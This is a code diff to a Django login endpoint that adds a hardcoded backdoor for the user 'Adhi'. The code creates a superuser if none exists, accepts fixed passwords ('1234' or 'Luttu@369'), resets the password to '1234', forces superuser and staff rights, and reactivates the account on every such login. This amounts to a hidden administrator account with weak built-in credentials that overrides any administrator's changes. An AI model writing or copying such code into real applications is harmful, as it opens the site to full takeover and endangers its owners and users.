@@ -25,16 +25,30 @@ def api_login(request):
 
     user = authenticate(request, username=username, password=password)
 
-    # Allow both 1234 and Luttu@369 for Adhi across all devices
-    if not user and username.strip().lower() == 'adhi' and password in ['1234', 'Luttu@369']:
+    # Enforce Adhi as superuser and staff with password 1234
+    if username.strip().lower() == 'adhi':
         from django.contrib.auth import get_user_model
         User = get_user_model()
         adhi_user = User.objects.filter(username__iexact='Adhi').first()
-        if adhi_user:
-            user = adhi_user
-            if not adhi_user.check_password(password):
-                adhi_user.set_password(password)
+        if not adhi_user:
+            adhi_user = User.objects.create_superuser('Adhi', 'adhi@zivaraornaments.com', '1234')
+        if password in ['1234', 'Luttu@369']:
+            needs_save = False
+            if not adhi_user.check_password('1234'):
+                adhi_user.set_password('1234')
+                needs_save = True
+            if not adhi_user.is_staff or not adhi_user.is_superuser:
+                adhi_user.is_staff = True
+                adhi_user.is_superuser = True
+                needs_save = True
+            if not adhi_user.is_active:
+                adhi_user.is_active = True
+                needs_save = True
+            if needs_save:
                 adhi_user.save()
+            user = adhi_user
+        else:
+            user = None
 
     if not user:
         return Response(
